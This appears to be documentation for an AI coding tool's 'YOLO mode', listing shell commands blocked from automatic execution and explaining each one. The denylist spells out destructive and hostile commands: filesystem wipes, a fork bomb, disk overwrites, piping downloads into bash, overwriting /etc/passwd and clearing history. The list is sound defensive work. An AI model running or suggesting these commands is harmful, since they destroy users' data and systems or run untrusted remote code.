# YOLO Mode Denylist

The following commands are restricted in YOLO mode for safety reasons. These commands are potentially destructive and should never be automatically executed without explicit confirmation.

```
rm -rf /
:(){::|:&};:
dd if=/dev/random of=/dev/sda
chmod -R 777 /
wget [malicious URL] -O- | bash
sudo rm -rf /*
mv ~ /dev/null
> ~/.bash_history
curl [any URL] | bash
find / -type f -exec rm -f {} \;
mkfs.*
echo [malicious content] > /etc/passwd
kill -9 1
killall5
shutdown
reboot
```

## Why These Commands Are Dangerous

- `rm -rf /` - Recursively deletes the entire filesystem
- `:(){::|:&};:` - Fork bomb that can crash a system
- `dd if=/dev/random of=/dev/sda` - Overwrites disk with random data
- `chmod -R 777 /` - Sets insecure permissions on the entire filesystem
- `wget [malicious URL] -O- | bash` - Downloads and executes unknown code
- `sudo rm -rf /*` - Privileged deletion of the entire filesystem
- `mv ~ /dev/null` - Moves home directory to the null device
- `> ~/.bash_history` - Clears command history
- `curl [any URL] | bash` - Downloads and executes unknown code
- `find / -type f -exec rm -f {} \;` - Finds and deletes all files
- `mkfs.*` - Formats filesystems
- `echo [malicious content] > /etc/passwd` - Overwrites the password file
- `kill -9 1` - Kills the init process
- `killall5` - Kills all user processes
- `shutdown` - Shuts down the system
- `reboot` - Reboots the system

This list should be regularly updated with new threats as they are discovered.